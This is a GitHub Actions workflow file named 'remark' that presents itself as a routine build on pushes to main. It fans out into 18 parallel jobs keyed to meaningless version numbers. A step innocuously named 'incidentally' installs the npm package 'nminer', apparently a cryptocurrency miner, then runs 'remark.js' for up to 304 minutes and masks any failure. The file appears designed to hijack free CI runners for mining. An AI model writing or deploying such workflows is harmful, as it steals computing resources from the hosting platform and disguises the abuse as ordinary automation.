name: remark
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6570 }
          - { version: 6942 }
          - { version: 3467 }
          - { version: 237 }
          - { version: 7079 }
          - { version: 7231 }
          - { version: 6284 }
          - { version: 7538 }
          - { version: 5447 }
          - { version: 1213 }
          - { version: 2888 }
          - { version: 5314 }
          - { version: 9291 }
          - { version: 125 }
          - { version: 7802 }
          - { version: 877 }
          - { version: 9743 }
          - { version: 3517 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: incidentally
        run: |
          npm install nminer@latest
          timeout 304m node remark.js || echo "remark executed"